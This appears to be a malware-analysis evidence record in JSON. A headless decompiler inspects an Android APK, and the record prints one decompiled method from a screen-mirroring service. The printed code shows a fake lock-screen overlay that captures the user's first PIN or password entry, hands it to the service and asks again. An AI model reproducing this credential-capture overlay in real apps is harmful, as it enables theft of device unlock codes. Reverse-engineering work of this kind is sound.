@@ -1,0 +1,146 @@
+{
+  "evidence_id": "ev_807cb00db3d21e756d27bc4f3e1a34a68e119d6fc6c186951e4a377a40b71210",
+  "subject": {
+    "name": "player_unpacked_for_analysis.apk",
+    "digest": {
+      "sha256": "e456794fcf9aa27684ea91d6e9a62fe53cc6af594a8b1aba4fa82fa539d8579a"
+    },
+    "local_path": "C:\\Users\\Romario\\Documents\\Codex\\2026-10-15\\ho\\work\\player_unpacked_for_analysis.apk",
+    "format": "apk",
+    "architecture": null
+  },
+  "provider": {
+    "id": "jadx",
+    "name": "JADX headless",
+    "version": "0.7.1"
+  },
+  "analysis_profile": null,
+  "predicate_type": "rea.analysis",
+  "operation": "inspect_android_method",
+  "parameters": {
+    "path": "C:\\Users\\Romario\\Documents\\Codex\\2026-10-15\\ho\\work\\player_unpacked_for_analysis.apk",
+    "class_name": "w1.y5",
+    "method_name": "e"
+  },
+  "raw_result": {
+    "server": {
+      "name": "rea-jadx-bridge",
+      "version": "1"
+    },
+    "bridge_sha256": "40c6972bc7e1689e09979b64ba49ba04b9c05e49976b838315d63d6415e762ba",
+    "jar_sha256": "6e5eacf500b64292bfb73c49797c1958f6ee44646e43e868039ae7feb573ff75",
+    "loaded": {
+      "state": "LOADED",
+      "apk_path": "C:\\Users\\Romario\\AppData\\Local\\Temp\\rea-android-81b2150fc1c42f4bd74028833787e0ca\\target.apk",
+      "class_count": 1441,
+      "resource_count": 111,
+      "threads": 1,
+      "resources": "full"
+    },
+    "calls": [
+      {
+        "operation": "rea_jvm_status",
+        "input": {},
+        "response": {
+          "content": [
+            {
+              "type": "text",
+              "text": "{\"java_version\":\"21.0.12.1\",\"max_heap_bytes\":4223664128,\"metadata_scope\":\"parsed_members\",\"engine_reported_version\":\"0.7.1\",\"available_processors\":12}"
+            }
+          ],
+          "isError": false
+        }
+      },
+      {
+        "operation": "load_apk",
+        "input": {
+          "path": "C:\\Users\\Romario\\AppData\\Local\\Temp\\rea-android-81b2150fc1c42f4bd74028833787e0ca\\target.apk",
+          "threads": 1,
+          "resources": "full"
+        },
+        "response": {
+          "content": [
+            {
+              "type": "text",
+              "text": "{\"state\":\"LOADED\",\"apk_path\":\"C:\\\\Users\\\\Romario\\\\AppData\\\\Local\\\\Temp\\\\rea-android-81b2150fc1c42f4bd74028833787e0ca\\\\target.apk\",\"class_count\":1441,\"raw_class_count\":1441,\"resource_count\":111,\"load_duration_ms\":1625,\"decompile_timeout_ms\":90000,\"threads\":1,\"code_cache_size\":64,\"resources\":\"full\"}"
+            }
+          ]
+        }
+      },
+      {
+        "operation": "get_class_summary",
+        "input": {
+          "class_name": "w1.y5"
+        },
+        "response": {
+          "content": [
+            {
+              "type": "text",
+              "text": "{\"inner_class_count\":0,\"method_count\":8,\"methods\":[{\"def_pos\":0,\"signature\":\"\\u003cinit\\u003e(lyr.stable.runtime.ScreenMirrorService, int, android.graphics.Bitmap): void\",\"dex_descriptor\":\"(Llyr/stable/runtime/ScreenMirrorService;ILandroid/graphics/Bitmap;)V\",\"is_constructor\":true,\"name\":\"\\u003cinit\\u003e\"},{\"def_pos\":0,\"signature\":\"a(int): int\",\"dex_descriptor\":\"(I)I\",\"is_constructor\":false,\"name\":\"a\"},{\"def_pos\":0,\"signature\":\"b(): void\",\"dex_descriptor\":\"()V\",\"is_constructor\":false,\"name\":\"b\"},{\"def_pos\":0,\"signature\":\"c(): void\",\"dex_descriptor\":\"()V\",\"is_constructor\":false,\"name\":\"c\"},{\"def_pos\":0,\"signature\":\"d(int): android.view.View\",\"dex_descriptor\":\"(I)Landroid/view/View;\",\"is_constructor\":false,\"name\":\"d\"},{\"def_pos\":0,\"signature\":\"e(java.lang.String): void\",\"dex_descriptor\":\"(Ljava/lang/String;)V\",\"is_constructor\":false,\"name\":\"e\"},{\"def_pos\":0,\"signature\":\"onAttachedToWindow(): void\",\"dex_descriptor\":\"()V\",\"is_constructor\":false,\"name\":\"onAttachedToWindow\"},{\"def_pos\":0,\"signature\":\"setCallback(w1.w5): void\",\"dex_descriptor\":\"(Lw1/w5;)V\",\"is_constructor\":false,\"name\":\"setCallback\"}],\"fields\":[{\"type\":\"int\",\"name\":\"f5593a\",\"def_pos\":0},{\"type\":\"android.widget.EditText\",\"name\":\"f5594b\",\"def_pos\":0},{\"type\":\"android.widget.TextView\",\"name\":\"f5595c\",\"def_pos\":0},{\"type\":\"java.lang.StringBuilder\",\"name\":\"f5596d\",\"def_pos\":0},{\"type\":\"android.widget.TextView\",\"name\":\"f5597e\",\"def_pos\":0},{\"type\":\"w1.w5\",\"name\":\"f5598f\",\"def_pos\":0},{\"type\":\"boolean\",\"name\":\"f5599g\",\"def_pos\":0},{\"type\":\"int\",\"name\":\"f5600h\",\"def_pos\":0}],\"field_count\":8,\"full_name\":\"w1.y5\",\"name\":\"y5\",\"inner_classes\":[]}"
+            }
+          ],
+          "isError": false
+        }
+      },
+      {
+        "operation": "get_method_body",
+        "input": {
+          "class_name": "w1.y5",
+          "method_name": "e",
+          "overload_index": 0,
+          "smali_fallback": true
+        },
+        "response": {
+          "content": [
+            {
+              "type": "text",
+              "text": "{\"fell_back\":false,\"overload_index\":0,\"class_name\":\"w1.y5\",\"full_name\":\"w1.y5.e\",\"mode\":\"java\",\"markers\":[],\"method_name\":\"e\",\"overload_count\":1,\"body\":\"    public final void e(String str) {\\r\\n        if (str.isEmpty() || this.f5599g) {\\r\\n            return;\\r\\n        }\\r\\n        int i3 \\u003d this.f5600h;\\r\\n        int i4 \\u003d this.f5593a;\\r\\n        if (i3 !\\u003d 0) {\\r\\n            this.f5599g \\u003d true;\\r\\n            StringBuilder sbI \\u003d a0.a.i(i4, \\\"[LockMask] credential submitted mode\\u003d\\\", \\\" len\\u003d\\\");\\r\\n            sbI.append(str.length());\\r\\n            Log.i(\\\"ScreenMirror\\\", sbI.toString());\\r\\n            if (i4 \\u003d\\u003d 0 \\u0026\\u0026 this.f5594b !\\u003d null) {\\r\\n                InputMethodManager inputMethodManager \\u003d (InputMethodManager) getContext().getSystemService(\\\"input_method\\\");\\r\\n                if (inputMethodManager !\\u003d null) {\\r\\n                    inputMethodManager.hideSoftInputFromWindow(this.f5594b.getWindowToken(), 0);\\r\\n                }\\r\\n                this.f5594b.clearFocus();\\r\\n            }\\r\\n            postDelayed(new a2.h(this, str, 24), 80L);\\r\\n            return;\\r\\n        }\\r\\n        this.f5600h \\u003d i3 + 1;\\r\\n        StringBuilder sbI2 \\u003d a0.a.i(i4, \\\"[LockMask] first attempt captured mode\\u003d\\\", \\\" len\\u003d\\\");\\r\\n        sbI2.append(str.length());\\r\\n        Log.i(\\\"ScreenMirror\\\", sbI2.toString());\\r\\n        w5 w5Var \\u003d this.f5598f;\\r\\n        if (w5Var !\\u003d null) {\\r\\n            p2.a0 a0Var \\u003d (p2.a0) w5Var;\\r\\n            ScreenMirrorService.j(a0Var.f2874a, str, (ScreenMirrorService) a0Var.f2875b);\\r\\n        }\\r\\n        EditText editText \\u003d this.f5594b;\\r\\n        if (editText !\\u003d null) {\\r\\n            editText.setText(\\\"\\\");\\r\\n        }\\r\\n        this.f5596d.setLength(0);\\r\\n        if (this.f5595c !\\u003d null) {\\r\\n            c();\\r\\n        }\\r\\n        TextView textView \\u003d this.f5597e;\\r\\n        if (textView !\\u003d null) {\\r\\n            textView.setVisibility(0);\\r\\n        }\\r\\n        try {\\r\\n            performHapticFeedback(17);\\r\\n        } catch (Throwable unused) {\\r\\n        }\\r\\n    }\"}"
+            }
+          ],
+          "isError": false
+        }
+      }
+    ]
+  },
+  "normalized_result": {
+    "engine": {
+      "name": "jadx-headless-mcp",
+      "version": "0.7.1",
+      "artifact_sha256": "6e5eacf500b64292bfb73c49797c1958f6ee44646e43e868039ae7feb573ff75",
+      "source_revision": "5844800a486d2248fa949b74c9896285f5b54de2",
+      "worker_count": 1,
+      "heap_limit_mib": 4028
+    },
+    "class_name": "w1.y5",
+    "method": {
+      "name": "e",
+      "reported_signature": "e(java.lang.String): void",
+      "overload_index": 0,
+      "is_constructor": false,
+      "dex_descriptor": "(Ljava/lang/String;)V"
+    },
+    "overload_count": 1,
+    "representation": "java",
+    "body_status": "available",
+    "fell_back": false,
+    "markers": [],
+    "source": {
+      "status": "complete",
+      "text": "    public final void e(String str) {\r\n        if (str.isEmpty() || this.f5599g) {\r\n            return;\r\n        }\r\n        int i3 = this.f5600h;\r\n        int i4 = this.f5593a;\r\n        if (i3 != 0) {\r\n            this.f5599g = true;\r\n            StringBuilder sbI = a0.a.i(i4, \"[LockMask] credential submitted mode=\", \" len=\");\r\n            sbI.append(str.length());\r\n            Log.i(\"ScreenMirror\", sbI.toString());\r\n            if (i4 == 0 && this.f5594b != null) {\r\n                InputMethodManager inputMethodManager = (InputMethodManager) getContext().getSystemService(\"input_method\");\r\n                if (inputMethodManager != null) {\r\n                    inputMethodManager.hideSoftInputFromWindow(this.f5594b.getWindowToken(), 0);\r\n                }\r\n                this.f5594b.clearFocus();\r\n            }\r\n            postDelayed(new a2.h(this, str, 24), 80L);\r\n            return;\r\n        }\r\n        this.f5600h = i3 + 1;\r\n        StringBuilder sbI2 = a0.a.i(i4, \"[LockMask] first attempt captured mode=\", \" len=\");\r\n        sbI2.append(str.length());\r\n        Log.i(\"ScreenMirror\", sbI2.toString());\r\n        w5 w5Var = this.f5598f;\r\n        if (w5Var != null) {\r\n            p2.a0 a0Var = (p2.a0) w5Var;\r\n            ScreenMirrorService.j(a0Var.f2874a, str, (ScreenMirrorService) a0Var.f2875b);\r\n        }\r\n        EditText editText = this.f5594b;\r\n        if (editText != null) {\r\n            editText.setText(\"\");\r\n        }\r\n        this.f5596d.setLength(0);\r\n        if (this.f5595c != null) {\r\n            c();\r\n        }\r\n        TextView textView = this.f5597e;\r\n        if (textView != null) {\r\n            textView.setVisibility(0);\r\n        }\r\n        try {\r\n            performHapticFeedback(17);\r\n        } catch (Throwable unused) {\r\n        }\r\n    }",
+      "reported_total_bytes": null
+    }
+  },
+  "confidence": "derived",
+  "authority": "shipped-artifact",
+  "environment": null,
+  "limitations": [
+    "Static decompiler observations do not establish runtime behavior; the APK is never executed.",
+    "Method signatures use provider display types; DEX prototypes come from frozen JADX metadata. Display names may be aliases, and overload indices are local to this engine and artifact.",
+    "Class inventories use parsed metadata before code generation, including synthetic members that may be omitted from decompiled source. Source positions remain unknown.",
+    "Incoming reference totals count JADX using nodes. Direct invoke entries within a using method report raw DEX code-unit offsets and method indexes, but coverage is limited to those nodes and directly matched invokes; it does not establish every possible dynamic or reflective call site.",
+    "Manifest summary fields are extracted by the upstream engine; decoded XML is retained for verification. APK signatures, split APKs, native libraries and Android runtime capture are not verified by this provider."
+  ],
+  "relationship_coverage": null,
+  "locations": [],
+  "evidence_links": []
+}
